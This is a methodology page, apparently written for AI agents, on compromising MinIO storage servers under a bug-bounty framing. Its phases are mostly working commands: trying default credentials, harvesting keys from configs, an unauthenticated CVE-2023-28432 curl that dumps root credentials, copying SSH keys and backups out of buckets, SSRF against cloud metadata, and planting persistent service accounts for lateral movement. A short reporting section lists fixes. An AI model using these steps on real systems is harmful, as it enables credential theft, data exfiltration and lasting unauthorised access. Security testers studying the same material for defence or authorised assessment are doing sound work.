---
technology: "MinIO"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-mined (2 writeups — pass 1 wave 4, 2026-11-12) + upstream-verified (GHSA-6xvq-wj2x-3h3q CVE-2023-28432, GHSA-m4qq-5f7c-693q CVE-2021-21287, MinIO root-credential docs)"
provenance: "corpus-grounded: 3 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

# MinIO bug-bounty methodology

Companion overview: [[minio]].

Observed anchors: metrics → version → CVE-2023-28432 env dump → `mc` bucket looting; and app config leaking the access pair → AWS CLI against a custom-port endpoint → SSH keys in a bucket. Both observed chains are credential-events; the CVEs below are the credential *sources*.

## Phase 0 — Recon

```
9000/tcp  open  http  Golang net/http (Server: MinIO)
9001/tcp  open  http  (console, newer releases)
54321/tcp open  http  Server: MinIO        ← custom ports are common; trust the header
nmap -sV -p 9000,9001 --script http-server-header 198.51.100.x
```

Any HTTP port that answers `HEAD /` with `Server: MinIO` or S3-style XML errors (`Content-Type: application/xml`, `X-Amz-Request-Id`) is the S3 API regardless of port. Grab the release string early — it gates both CVEs:

```bash
curl -s http://198.51.100.x:9000/ | head -c 300          # XML AccessDenied (API alive)
curl -s http://198.51.100.x:9000/minio/health/live        # 200 = server up, no auth needed
curl -s http://198.51.100.x:9000/minio/prometheus/metrics | grep -i version   # if metrics public
```

## Phase 1 — Default and guessed credentials

```bash
mc alias set tgt http://198.51.100.x:9000 minioadmin minioadmin
mc ls tgt                                                    # buckets = root works
```

Console login with the same pair at `http://198.51.100.x:9000` (or :9001). Decision: any bucket listing → Phase 3. `AccessDenied` → try harvested keys (Phase 2), then CVE-2023-28432 (Phase 4), then anonymous bucket access (Phase 5).

## Phase 2 — Credential harvesting (app-side)

Keys leak from the consuming application — once you have file read or an admin panel, grep for:

- `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD` (env blocks, docker-compose, k8s secrets/manifests)
- S3 settings pages in CMS/admin UIs (one observed chain: the platform's storage settings showed access key + secret in cleartext)
- `~/.aws/credentials`, `~/.mc/config.json` (mc aliases store plaintext pairs), application `.env` (`S3_ACCESS_KEY=`, `S3_SECRET_KEY=`, `AWS_*`)

Then drive the S3 API with either client:

```bash
aws configure --profile tgt          # paste harvested access key / secret
aws --profile tgt --endpoint-url=http://198.51.100.x:9000 s3 ls
aws --profile tgt --endpoint-url=http://198.51.100.x:9000 s3 ls s3://internal
aws --profile tgt --endpoint-url=http://198.51.100.x:9000 s3 cp s3://internal/.ssh/id_ed25519 ./
```

## Phase 3 — Bucket enumeration and looting (with any valid key)

```bash
mc alias set tgt http://198.51.100.x:9000 <ACCESS> <SECRET>
mc ls tgt                 # all buckets
mc ls tgt/<bucket> --recursive
mc cp tgt/<bucket>/home_backup.tar.gz .
```

High-yield object classes seen in practice: `home_backup.tar.gz` and `.ssh/` keys (home-dir backups), config dumps, DB exports, presigned URL secrets. Check `mc admin` surfaces too — a root key allows `mc admin info` (topology, versions, users) and user/policy administration.

## Phase 4 — CVE-2023-28432: unauthenticated environment dump (verified upstream)

GHSA-6xvq-wj2x-3h3q / CVE-2023-28432 — in **cluster deployments** (distributed MinIO), `POST /minio/bootstrap/v1/verify` returns the server system config including every `MINIO_*` env var — `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD`, KMS keys — unauthenticated. Affects everything from `RELEASE.2021-08-31T05-46-54Z` onward until fixed in `RELEASE.2023-03-20T20-16-18Z` (reporter RicterZ; an observed build `2023-03-13T19:46-17Z` falls inside the window):

```bash
curl -s -XPOST http://198.51.100.x:9000/minio/bootstrap/v1/verify | jq
#  "MinioEnv": { "MINIO_ROOT_USER": "...", "MINIO_ROOT_PASSWORD": "...", ... }
```

Take the pair to Phase 3. Finding the endpoint usually requires the internal cluster hostname/path first — mine metrics pages and app JS for `<host>/minio/v2/metrics/cluster` URLs (one observed disclosure chain was exactly that).

## Phase 5 — Anonymous bucket access and SSRF

- **Public buckets**: with no credentials at all, test per-bucket anonymous ops — S3 ListObjects/GetObject succeed where the policy allows `*`. `curl http://198.51.100.x:9000/<bucket>/` and awscli without credentials against guessed names (backups, uploads, internal, data).
- **CVE-2021-21287 console SSRF** (GHSA-m4qq-5f7c-693q): the Browser API's URL-fetching features (import/publish/probe endpoints) let a console-authenticated user point the server at arbitrary URLs — cloud metadata (`http://169.254.169.254/...`), internal HTTP services. Fixed in `RELEASE.2021-01-30T00-20-58Z`; workaround `MINIO_BROWSER=off`. With any console account on an old build, use it for internal recon and credential theft where IMDS lives.

## Phase 6 — Post-exploitation

- Root on MinIO = durable persistence: create service-account access keys or IAM users under an innocuous policy (`mc admin user add`, `mc admin svcacct add`) and note them for the report.
- Bucket contents → follow the data: SSH keys for lateral movement, DB dumps for offline cracking, app secrets for the next box.
- `mc admin config get` (root) dumps server config — notification targets (webhooks with embedded URLs/tokens) and KMS settings included.

## Phase 7 — Reporting

Rank: unauth env/root-cred dump (28432) > default or leaked root creds (total store access) > console SSRF > anonymous bucket read > per-key scope abuse. Recommend: root creds always set and rotated, `MINIO_BROWSER=off` if unused, current release, metrics/console never public, IMDSv2 where the SSRF class matters.

## Tool map (prose)

mc (the official MinIO client — `alias set`, `ls`, `cp`, `admin` subcommands) as the primary driver; the AWS CLI (`aws s3*` with `--endpoint-url`) since MinIO is SigV4-compatible end to end; curl for unauth endpoints (bootstrap verify, health, metrics, XML errors); jq for the env dump; metasploit/auxiliary scanners where an org prefers them. The tools vault holds per-tool reference notes.
